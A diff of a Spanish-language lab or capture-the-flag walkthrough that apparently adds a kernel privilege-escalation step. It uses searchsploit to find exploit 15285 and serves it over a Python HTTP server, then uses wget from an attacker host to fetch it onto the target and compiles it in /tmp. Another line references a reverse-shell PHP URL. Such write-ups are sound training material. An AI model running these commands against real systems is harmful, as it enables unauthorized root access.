@@ -144,6 +144,25 @@ URL: `http://192.168.25.131:666/reverseshell.php`
 
 ![21](https://user-images.githubusercontent.com/75953873/182731893-d0f3e803-277c-422d-b78c-fd9f8c22c66d.png)
 
-- *Paso 9:* Buscar y explotar versión del kernel:
+- *Paso 10:* Buscar y explotar versión del kernel:
 
 ![22](https://user-images.githubusercontent.com/75953873/182732251-c05c0ba1-7e2e-4da5-a75c-8676435d3a96.png)
+
+```
+searchsploit 2.6.3 | grep "RDS"
+searchsploit -m 15285
+```
+![23](https://user-images.githubusercontent.com/75953873/182733308-febf508c-8e3b-42b7-ba66-9b3eb82b6494.png)
+
+Abrir servidor local con Python3:
+```python
+python3 -m http.server 80
+```
+
+Descargar y compilar exploit en el directorio `/tmp`:
+```
+cd /tmp
+wget http://192.168.1.9/15285.c
+gcc 15285.c -o kernel
+```
+![24](https://user-images.githubusercontent.com/75953873/182735176-1cd40bee-e4d0-4956-bc1e-2e593608b292.png)
